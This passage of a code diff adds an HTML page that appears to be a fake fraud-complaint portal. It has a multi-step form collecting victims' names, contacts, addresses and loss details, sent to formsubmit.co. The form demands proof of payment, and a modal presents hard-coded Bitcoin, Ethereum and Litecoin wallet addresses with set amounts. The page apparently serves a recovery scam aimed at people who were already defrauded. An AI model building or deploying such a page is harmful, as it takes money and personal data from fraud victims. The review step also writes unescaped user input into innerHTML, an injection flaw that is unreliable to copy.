value="KE">Kenya</option><option value="KI">Kiribati</option><option value="KP">Korea, North</option><option value="KR">Korea, South</option><option value="KW">Kuwait</option><option value="KG">Kyrgyzstan</option><option value="LA">Laos</option><option value="LV">Latvia</option><option value="LB">Lebanon</option><option value="LS">Lesotho</option><option value="LR">Liberia</option><option value="LY">Libya</option><option value="LI">Liechtenstein</option><option value="LT">Lithuania</option><option value="LU">Luxembourg</option><option value="MO">Macau</option><option value="MK">North Macedonia</option><option value="MG">Madagascar</option><option value="MW">Malawi</option><option value="MY">Malaysia</option><option value="MV">Maldives</option><option value="ML">Mali</option><option value="MT">Malta</option><option value="MH">Marshall Islands</option><option value="MR">Mauritania</option><option value="MU">Mauritius</option><option value="MX">Mexico</option><option value="FM">Micronesia</option><option value="MD">Moldova</option><option value="MC">Monaco</option><option value="MN">Mongolia</option><option value="ME">Montenegro</option><option value="MA">Morocco</option><option value="MZ">Mozambique</option><option value="MM">Myanmar</option><option value="NA">Namibia</option><option value="NR">Nauru</option><option value="NP">Nepal</option><option value="NL">Netherlands</option><option value="NZ">New Zealand</option><option value="NI">Nicaragua</option><option value="NE">Niger</option><option value="NG">Nigeria</option><option value="NO">Norway</option><option value="OM">Oman</option><option value="PK">Pakistan</option><option value="PW">Palau</option><option value="PA">Panama</option><option value="PG">Papua New Guinea</option><option value="PY">Paraguay</option><option value="PE">Peru</option><option value="PH">Philippines</option><option value="PL">Poland</option><option value="PT">Portugal</option><option value="QA">Qatar</option><option value="RO">Romania</option><option value="RU">Russia</option><option value="RW">Rwanda</option><option value="KN">Saint Kitts and Nevis</option><option value="LC">Saint Lucia</option><option value="VC">Saint Vincent and the Grenadines</option><option value="WS">Samoa</option><option value="SM">San Marino</option><option value="ST">Sao Tome and Principe</option><option value="SA">Saudi Arabia</option><option value="SN">Senegal</option><option value="RS">Serbia</option><option value="SC">Seychelles</option><option value="SL">Sierra Leone</option><option value="SG">Singapore</option><option value="SK">Slovakia</option><option value="SI">Slovenia</option><option value="SB">Solomon Islands</option><option value="SO">Somalia</option><option value="ZA">South Africa</option><option value="SS">South Sudan</option><option value="ES">Spain</option><option value="LK">Sri Lanka</option><option value="SD">Sudan</option><option value="SR">Suriname</option><option value="SE">Sweden</option><option value="CH">Switzerland</option><option value="SY">Syria</option><option value="TW">Taiwan</option><option value="TJ">Tajikistan</option><option value="TZ">Tanzania</option><option value="TH">Thailand</option><option value="TL">Timor-Leste</option><option value="TG">Togo</option><option value="TO">Tonga</option><option value="TT">Trinidad and Tobago</option><option value="TN">Tunisia</option><option value="TR">Turkey</option><option value="TM">Turkmenistan</option><option value="TV">Tuvalu</option><option value="UG">Uganda</option><option value="UA">Ukraine</option><option value="AE">United Arab Emirates</option><option value="GB">United Kingdom</option><option value="US">United States</option><option value="UY">Uruguay</option><option value="UZ">Uzbekistan</option><option value="VU">Vanuatu</option><option value="VA">Vatican City</option><option value="VE">Venezuela</option><option value="VN">Vietnam</option><option value="YE">Yemen</option><option value="ZM">Zambia</option><option value="ZW">Zimbabwe</option>
+    </select>
+
+    <script>
+        // --- DATA ---
+        const countryCallingCodes = {"AF":"+93","AL":"+355","DZ":"+213","AS":"+1-684","AD":"+376","AO":"+244","AI":"+1-264","AQ":"+672","AG":"+1-268","AR":"+54","AM":"+374","AW":"+297","AU":"+61","AT":"+43","AZ":"+994","BS":"+1-242","BH":"+973","BD":"+880","BB":"+1-246","BY":"+375","BE":"+32","BZ":"+501","BJ":"+229","BM":"+1-441","BT":"+975","BO":"+591","BA":"+387","BW":"+267","BR":"+55","IO":"+246","BN":"+673","BG":"+359","BF":"+226","BI":"+257","KH":"+855","CM":"+237","CA":"+1","CV":"+238","KY":"+1-345","CF":"+236","TD":"+235","CL":"+56","CN":"+86","CX":"+61","CC":"+61","CO":"+57","KM":"+269","CG":"+242","CD":"+243","CK":"+682","CR":"+506","CI":"+225","HR":"+385","CU":"+53","CY":"+357","CZ":"+420","DK":"+45","DJ":"+253","DM":"+1-767","DO":"+1-809","EC":"+593","EG":"+20","SV":"+503","GQ":"+240","ER":"+291","EE":"+372","ET":"+251","FJ":"+679","FI":"+358","FR":"+33","GA":"+241","GM":"+220","GE":"+995","DE":"+49","GH":"+233","GR":"+30","GD":"+1-473","GU":"+1-671","GT":"+502","GN":"+224","GW":"+245","GY":"+592","HT":"+509","HN":"+504","HK":"+852","HU":"+36","IS":"+354","IN":"+91","ID":"+62","IR":"+98","IQ":"+964","IE":"+353","IL":"+972","IT":"+39","JM":"+1-876","JP":"+81","JO":"+962","KZ":"+7","KE":"+254","KI":"+686","KP":"+850","KR":"+82","KW":"+965","KG":"+996","LA":"+856","LV":"+371","LB":"+961","LS":"+266","LR":"+231","LY":"+218","LI":"+423","LT":"+370","LU":"+352","MO":"+853","MK":"+389","MG":"+261","MW":"+265","MY":"+60","MV":"+960","ML":"+223","MT":"+356","MH":"+692","MR":"+222","MU":"+230","MX":"+52","FM":"+691","MD":"+373","MC":"+377","MN":"+976","ME":"+382","MA":"+212","MZ":"+258","MM":"+95","NA":"+264","NR":"+674","NP":"+977","NL":"+31","NZ":"+64","NI":"+505","NE":"+227","NG":"+234","NO":"+47","OM":"+968","PK":"+92","PW":"+680","PA":"+507","PG":"+675","PY":"+595","PE":"+51","PH":"+63","PL":"+48","PT":"+351","QA":"+974","RO":"+40","RU":"+7","RW":"+250","KN":"+1-869","LC":"+1-758","VC":"+1-784","WS":"+685","SM":"+378","ST":"+239","SA":"+966","SN":"+221","RS":"+381","SC":"+248","SL":"+232","SG":"+65","SK":"+421","SI":"+386","SB":"+677","SO":"+252","ZA":"+27","SS":"+211","ES":"+34","LK":"+94","SD":"+249","SR":"+597","SE":"+46","CH":"+41","SY":"+963","TW":"+886","TJ":"+992","TZ":"+255","TH":"+66","TL":"+670","TG":"+228","TO":"+676","TT":"+1-868","TN":"+216","TR":"+90","TM":"+993","TV":"+688","UG":"+256","UA":"+380","AE":"+971","GB":"+44","US":"+1","UY":"+598","UZ":"+998","VU":"+678","VA":"+379","VE":"+58","VN":"+84","YE":"+967","ZM":"+260","ZW":"+263"};
+
+        // --- FORM LOGIC ---
+        let currentSection = 1;
+        const totalSections = 3;
+
+        const complaintForm = document.getElementById('complaintForm');
+        complaintForm.addEventListener('submit', function(event) {
+            // Validate the final section before allowing submission
+            if (!validateSection(3)) {
+                event.preventDefault(); // Stop submission if validation fails
+                return;
+            }
+            
+            // Give user feedback that submission is in progress
+            const submitButton = document.getElementById('submit-btn');
+            submitButton.disabled = true;
+            submitButton.textContent = 'Submitting...';
+            
+            // Allow the form to submit to formsubmit.co
+        });
+        
+        function nextSection(current, next) {
+            if (!validateSection(current)) return;
+            
+            const currentSectionEl = document.getElementById(`section${current}`);
+            const nextSectionEl = document.getElementById(`section${next}`);
+            
+            currentSectionEl.classList.add('is-exiting');
+            
+            setTimeout(() => {
+                currentSectionEl.classList.remove('active', 'is-exiting');
+                nextSectionEl.classList.add('active');
+
+                // Update progress bar
+                const progressBar = document.getElementById('progress-bar');
+                const steps = document.querySelectorAll('.step');
+                if (next > totalSections) { // Handle going past the last step if needed for a final "submitted" view
+                     progressBar.style.width = '100%';
+                } else {
+                     progressBar.style.width = `${((next -1) / (totalSections-1)) * 100}%`;
+                }
+
+                // Update step indicators
+                steps.forEach((step, index) => {
+                    const div = step.querySelector('div');
+                    const p = step.querySelector('p');
+                    if (index < next) {
+                        div.classList.replace('bg-gray-200', 'bg-blue-500');
+                        div.classList.replace('text-gray-600', 'text-white');
+                        p.classList.replace('text-gray-500', 'text-blue-600');
+                    } else {
+                         div.classList.replace('bg-blue-500','bg-gray-200');
+                         div.classList.replace('text-white','text-gray-600');
+                         p.classList.replace('text-blue-600','text-gray-500');
+                    }
+                });
+
+                currentSection = next;
+                window.scrollTo(0,0);
+                if (next === 3) { 
+                    updateReviewSection();
+                }
+            }, 400);
+        }
+        
+        function prevSection(current, prev) {
+            const currentSectionEl = document.getElementById(`section${current}`);
+            const prevSectionEl = document.getElementById(`section${prev}`);
+            
+            currentSectionEl.classList.add('is-exiting-back');
+
+            setTimeout(() => {
+                currentSectionEl.classList.remove('active', 'is-exiting-back');
+                prevSectionEl.classList.add('active');
+                
+                // Update progress bar
+                document.getElementById('progress-bar').style.width = `${((prev-1)/(totalSections -1 )) * 100}%`;
+
+                // Update step indicators
+                document.querySelectorAll('.step').forEach((step, index) => {
+                    const div = step.querySelector('div');
+                    const p = step.querySelector('p');
+                    if (index < prev) {
+                        div.classList.replace('bg-gray-200', 'bg-blue-500');
+                        div.classList.replace('text-gray-600', 'text-white');
+                        p.classList.replace('text-gray-500', 'text-blue-600');
+                    } else {
+                         div.classList.replace('bg-blue-500','bg-gray-200');
+                         div.classList.replace('text-white','text-gray-600');
+                         p.classList.replace('text-blue-600','text-gray-500');
+                    }
+                });
+
+                currentSection = prev;
+                window.scrollTo(0,0);
+            }, 400);
+        }
+        
+        function validateSection(section) {
+            let isValid = true;
+            clearErrors();
+            
+            if (section === 1) {
+                ['firstName', 'lastName', 'email'].forEach(id => {
+                    const field = document.getElementById(id);
+                    if (!field.value.trim()) { showError(id, `This field is required`); isValid = false; }
+                });
+                const email = document.getElementById('email');
+                if (email.value.trim() && !validateEmail(email.value.trim())) { showError('email', 'Please enter a valid email address'); isValid = false; }
+                const phone = document.getElementById('phone');
+                if (phone.value.trim() && !validatePhone(phone.value.trim())) { showError('phone', 'Please enter a valid phone number'); isValid = false; }
+            }
+            if (section === 2) {
+                if (!document.getElementById('complaintType').value) { showError('complaintType', 'Please select a fraud type'); isValid = false; }
+                const complaintDate = document.getElementById('complaintDate');
+                if (!complaintDate.value) { showError('complaintDate', 'Please select the date'); isValid = false; } 
+                else if (new Date(complaintDate.value) > new Date()) { showError('complaintDate', 'Date cannot be in the future'); isValid = false; }
+                if (document.getElementById('complaintDetails').value.trim().length < 20) { showError('complaintDetails', 'Please provide more details (minimum 20 characters)'); isValid = false; }
+                if (!document.getElementById('paymentConfirmation').checked) { showError('paymentConfirmation', 'Please confirm payment was made'); isValid = false; }
+                if (document.getElementById('payment-file-upload').files.length === 0) { showError('payment-file-upload', 'Please upload proof of payment'); isValid = false; }
+            }
+            if (section === 3) {
+                 if (!document.getElementById('confirm').checked) {
+                    showError('confirm', 'Please confirm the information is accurate');
+                    isValid = false;
+                 }
+            }
+            return isValid;
+        }
+        
+        function showError(fieldId, message) {
+            const errorElement = document.getElementById(`${fieldId}-error`);
+            const field = document.getElementById(fieldId);
+            if(field) field.classList.add('input-error');
+            if(errorElement) errorElement.textContent = message;
+        }
+
+        function clearErrors() {
+            document.querySelectorAll('.error-message').forEach(el => el.textContent = '');
+            document.querySelectorAll('.input-error').forEach(el => el.classList.remove('input-error'));
+        }
+
+        function validateEmail(email) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email); }
+        function validatePhone(phone) { return /^[\+]?[(]?[0-9]{3}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}$/.test(phone); }
+        
+        function selectComplaintType(buttonElement, type) {
+            document.getElementById('complaintType').value = type;
+            document.querySelectorAll('#section2 .grid .complaint-type-btn').forEach(btn => {
+                btn.classList.toggle('active', btn === buttonElement);
+            });
+            buttonElement.classList.add('pop-animation');
+            buttonElement.addEventListener('animationend', () => buttonElement.classList.remove('pop-animation'), { once: true });
+        }
+        
+        function toggleAmountRange(buttonElement, method) {
+            const parentContainer = buttonElement.parentElement;
+            const wasActive = parentContainer.classList.contains('active');
+            
+            document.querySelectorAll('.range-container').forEach(container => {
+                container.classList.remove('active');
+                container.querySelector('.complaint-type-btn').classList.remove('active');
+            });
+            
+            document.getElementById('methodOfLoss').value = '';
+            
+            if (!wasActive) {
+                parentContainer.classList.add('active');
+                buttonElement.classList.add('active');
+                buttonElement.classList.add('pop-animation');
+                buttonElement.addEventListener('animationend', () => buttonElement.classList.remove('pop-animation'), { once: true });
+                document.getElementById('methodOfLoss').value = method;
+            }
+        }
+
+        function createReviewItem(label, value) {
+            if (!value || value.trim() === 'N/A' || value.trim() === '' || value.trim() === '0 file(s) attached' || value.trim() === '$') return '';
+            return `<div><span class="text-gray-500">${label}:</span> <strong class="text-gray-800">${value}</strong></div>`;
+        }
+
+        function createReviewPara(label, value) {
+            if (!value || value.trim() === '') return '';
+             return `<div class="md:col-span-2"><span class="text-gray-500">${label}:</span> <p class="text-gray-800 font-medium whitespace-pre-wrap">${value}</p></div>`;
+        }
+        
+        function updateReviewSection() {
+            // Personal Info
+            document.getElementById('review-name').textContent = `${document.getElementById('firstName').value} ${document.getElementById('lastName').value}`;
+            document.getElementById('review-email').textContent = document.getElementById('email').value || 'N/A';
+            document.getElementById('review-phone').textContent = document.getElementById('phone').value ? `${document.getElementById('calling-code').textContent} ${document.getElementById('phone').value}` : 'N/A';
+            document.getElementById('review-age').textContent = document.getElementById('age').value || 'N/A';
+            document.getElementById('review-country').textContent = document.getElementById('country').value || 'N/A';
+            document.getElementById('review-state').textContent = document.getElementById('state').value || 'N/A';
+            document.getElementById('review-city').textContent = document.getElementById('city').value || 'N/A';
+            document.getElementById('review-address').textContent = `${document.getElementById('address').value}, ${document.getElementById('zip').value}`.replace(/^,|,$/g, '').trim() || 'N/A';
+            document.getElementById('review-zip').textContent = document.getElementById('zip').value || 'N/A';
+            
+            // Complaint Details
+            const reviewContainer = document.getElementById('review-complaint-details-dynamic');
+            reviewContainer.innerHTML = ''; 
+
+            let reviewHTML = '';
+            reviewHTML += createReviewItem('Date Filled', formatDate(document.getElementById('complaintDate').value));
+            reviewHTML += createReviewItem('Affected by Incident?', document.querySelector('input[name="Affected"]:checked').value);
+            reviewHTML += createReviewItem('Contacted Bank/Institution?', document.querySelector('input[name="Contacted Bank"]:checked').value);
+            reviewHTML += createReviewItem('Fraud Type', document.getElementById('complaintType').value);
+            reviewHTML += createReviewItem('Amount Lost (Exact)', document.getElementById('TotalAmountLost').value ? `$${document.getElementById('TotalAmountLost').value}` : 'N/A');
+
+            const methodOfLoss = document.getElementById('methodOfLoss').value;
+            if(methodOfLoss) {
+                 reviewHTML += createReviewItem('Primary Method of Loss', methodOfLoss);
+                 const activeContainer = document.querySelector('.range-container.active');
+                 if(activeContainer) {
+                    activeContainer.querySelectorAll('.hidden-dropdown input').forEach(input => {
+                       reviewHTML += createReviewItem(input.placeholder, input.value);
+                    });
+                 }
+            }
+
+            reviewHTML += createReviewPara('Complaint Details', document.getElementById('complaintDetails').value);
+            reviewHTML += createReviewItem('Complaint Evidence', `${document.getElementById('complaint-file-upload').files.length} file(s) attached`);
+            reviewHTML += createReviewItem('Payment Slip(s)', `${document.getElementById('payment-file-upload').files.length} file(s) attached`);
+
+            reviewContainer.innerHTML = reviewHTML;
+        }
+
+        function formatDate(dateString) {
+            if (!dateString) return 'N/A';
+            const date = new Date(dateString);
+            const userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const dateInUserTz = new Date(date.toLocaleString('en-US', { timeZone: userTimezone }));
+            return dateInUserTz.toLocaleDateString(undefined, { year: 'numeric', month: 'long', day: 'numeric' });
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const countrySearchInput = document.getElementById('countrySearch');
+            const countryHiddenInput = document.getElementById('country');
+            const dropdown = document.getElementById('countryDropdown');
+            const countrySource = document.getElementById('country-list-source');
+            const callingCodeSpan = document.getElementById('calling-code');
+
+            const countryOptions = Array.from(countrySource.options).filter(opt => opt.value).map(opt => ({
+                value: opt.value,
+                text: opt.textContent
+            }));
+            
+            countrySource.remove();
+
+            function renderDropdown(filteredCountries) {
+                dropdown.innerHTML = '';
+                filteredCountries.forEach(country => {
+                    const div = document.createElement('div');
+                    div.textContent = country.text;
+                    div.dataset.value = country.value;
+                    div.addEventListener('click', () => {
+                        countrySearchInput.value = country.text;
+                        countryHiddenInput.value = country.text;
+                        dropdown.style.display = 'none';
+                        const callingCode = countryCallingCodes[country.value] || '+?';
+                        callingCodeSpan.textContent = callingCode;
+                    });
+                    dropdown.appendChild(div);
+                });
+            }
+
+            countrySearchInput.addEventListener('input', () => {
+                const searchTerm = countrySearchInput.value.toLowerCase();
+                const filtered = countryOptions.filter(country => country.text.toLowerCase().includes(searchTerm));
+                renderDropdown(filtered);
+                dropdown.style.display = 'block';
+            });
+
+            countrySearchInput.addEventListener('focus', () => {
+                renderDropdown(countryOptions);
+                dropdown.style.display = 'block';
+            });
+
+            document.addEventListener('click', (e) => {
+                if (!e.target.closest('.relative')) {
+                    dropdown.style.display = 'none';
+                }
+            });
+
+            const defaultCountryCode = 'US';
+            const defaultCountryName = 'United States';
+            countryHiddenInput.value = defaultCountryName;
+            countrySearchInput.value = defaultCountryName;
+            callingCodeSpan.textContent = countryCallingCodes[defaultCountryCode];
+        });
+
+        // --- PAYMENT MODAL SCRIPT ---
+        const modalOverlay = document.getElementById('payment-modal-overlay');
+
+        function openPaymentModal() {
+            modalOverlay.classList.add('visible');
+        }
+
+        function closePaymentModal() {
+            modalOverlay.classList.remove('visible');
+        }
+        
+        modalOverlay.addEventListener('click', closePaymentModal);
+
+        function selectCrypto(element, crypto) {
+            if (element.classList.contains('active')) return;
+
+            const paymentDetails = document.getElementById('payment-details');
+            paymentDetails.style.opacity = 0;
+            
+            setTimeout(() => {
+                document.querySelectorAll('.crypto-option').forEach(option => option.classList.remove('active', 'pop-animation'));
+                element.classList.add('active', 'pop-animation');
+                element.addEventListener('animationend', () => element.classList.remove('pop-animation'), { once: true });
+
+                const amountCrypto = document.getElementById('amount-crypto');
+                const exchangeRate = document.getElementById('exchange-rate');
+                const qrCodeImg = document.getElementById('qr-code-img');
+                const walletAddressText = document.getElementById('wallet-address-text');
+                
+                if (crypto === 'BTC') {
+                    amountCrypto.innerText = '0.0013 BTC';
+                    exchangeRate.innerText = 'Rate: 1 BTC = $116,994.60 USD';
+                    const btcAddress = 'bc1qyca4l5qtdznrpxj2mqedqfddnr0uqa946qa35l';
+                    walletAddressText.innerText = btcAddress;
+                    qrCodeImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=bitcoin:${btcAddress}`;
+                } else if (crypto === 'ETH') {
+                    amountCrypto.innerText = '0.0401 ETH';
+                    exchangeRate.innerText = 'Rate: 1 ETH = $3,742.56 USD';
+                    const ethAddress = '0xb602B86F816792718358507dD0A410B04166Ea80';
+                    walletAddressText.innerText = ethAddress;
+                    qrCodeImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=ethereum:${ethAddress}`;
+                } else if (crypto === 'LTC') {
+                    amountCrypto.innerText = '1.39 LTC';
+                    exchangeRate.innerText = 'Rate: 1 LTC = $108.10 USD';
+                    const ltcAddress = 'ltc1qn9e5fytmdx0y4p2g35qh45e7680r48z6syjkjd';
+                    walletAddressText.innerText = ltcAddress;
+                    qrCodeImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=litecoin:${ltcAddress}`;
+                }
+                paymentDetails.style.opacity = 1;
+            }, 300);
+        }
+
+        function copyCryptoAddress(button) {
+            const walletAddress = document.getElementById('wallet-address-text').innerText;
+            navigator.clipboard.writeText(walletAddress).then(() => {
+                button.innerText = 'Copied! ✔';
+                button.disabled = true;
+                setTimeout(() => {
+                    button.innerText = 'Copy';
+                    button.disabled = false;
+                }, 2000);
+            }).catch(err => {
+                console.error('Failed to copy address: ', err);
+                button.innerText = 'Failed!';
+                setTimeout(() => { button.innerText = 'Copy'; }, 2000);
+            });
+        }
+
+        function handleFileUpload(inputId, listId) {
+            const input = document.getElementById(inputId);
+            const listContainer = document.getElementById(listId);
+            const files = input.files;
+            
+            listContainer.innerHTML = ''; // Clear previous list
+            if (files.length > 0) {
+                const ul = document.createElement('ul');
+                ul.className = 'list-disc pl-5 text-left text-xs';
+                for (const file of files) {
+                    const li = document.createElement('li');
+                    li.textContent = file.name;
+                    ul.appendChild(li);
+                }
+                listContainer.appendChild(ul);
+            }
+        }
+    </script>
+</body>
+</html>
